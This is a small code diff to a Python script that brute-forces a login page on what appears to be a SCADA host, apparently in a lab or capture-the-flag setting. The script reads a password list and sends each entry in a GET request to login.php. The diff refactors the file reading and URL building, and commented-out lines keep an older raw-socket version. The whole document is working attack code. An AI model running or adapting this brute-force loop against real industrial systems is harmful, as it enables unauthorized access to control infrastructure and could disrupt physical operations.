@@ -17,10 +17,12 @@ import random
 #clientSocket = socket(AF_INET, SOCK_STREAM)
 #clientSocket.connect((dest_ip, dest_port))
 #
-passwords = open("passwords.txt", "r")
-#
+with open("passwords.txt") as file:
+	passwords = file.read().splitlines()
+	
 for password in passwords:
-	ihatemylife = requests.get("http://scada.m4i.local//login.php?command={}".format(password))
+	URL = 'http://scada.m4i.local/login.php?command={}'.format(password)
+	ihatemylife = requests.get(url = URL)
 	#message = "GET /login.php?command={} HTTP/1.1\r\n".format(password)
 	#clientSocket.send(message.encode())
 	#time.sleep(0.1) #dont overload buffer
